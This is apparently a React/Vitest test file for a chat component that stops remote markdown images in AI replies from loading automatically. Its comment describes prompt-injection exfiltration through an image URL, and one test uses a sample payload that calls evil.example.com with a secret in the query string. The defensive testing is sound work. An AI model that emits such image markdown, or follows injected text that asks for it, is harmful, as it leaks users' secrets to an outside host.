import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { MessageResponse } from "./message";

// AI replies are untrusted markdown: a prompt-injected `![x](https://evil/exfil?d=<secret>)`
// must not auto-load, since the request itself (query string, headers) can
// leak data the moment the browser fetches it — no click required. Relative
// and same-origin images still work (avatars, attachments served by us);
// links stay clickable (Streamdown's own link-safety modal gates those).
describe("MessageResponse images", () => {
  it("drops a remote image entirely so it never auto-loads", () => {
    // Streamdown's image component renders nothing when src is falsy, so
    // dropping the src (via urlTransform) removes the <img> outright rather
    // than leaving a broken/empty-src element behind.
    const { container } = render(
      <MessageResponse>
        {"![leak](https://evil.example.com/exfil.png?d=secret)"}
      </MessageResponse>,
    );
    expect(container.querySelector("img")).toBeNull();
  });

  it("keeps a relative image's src", () => {
    const { container } = render(
      <MessageResponse>{"![avatar](/static/avatar.png)"}</MessageResponse>,
    );
    const img = container.querySelector("img");
    expect(img?.getAttribute("src")).toBe("/static/avatar.png");
  });

  it("keeps a same-origin absolute image's src", () => {
    const { container } = render(
      <MessageResponse>
        {`![avatar](${window.location.origin}/static/avatar.png)`}
      </MessageResponse>,
    );
    const img = container.querySelector("img");
    expect(img?.getAttribute("src")).toBe(
      `${window.location.origin}/static/avatar.png`,
    );
  });

  it("keeps a remote link (Streamdown renders it as a link-safety button, not stripped)", () => {
    render(
      <MessageResponse>{"[docs](https://evil.example.com/x)"}</MessageResponse>,
    );
    expect(screen.getByText("docs")).toBeInTheDocument();
  });
});
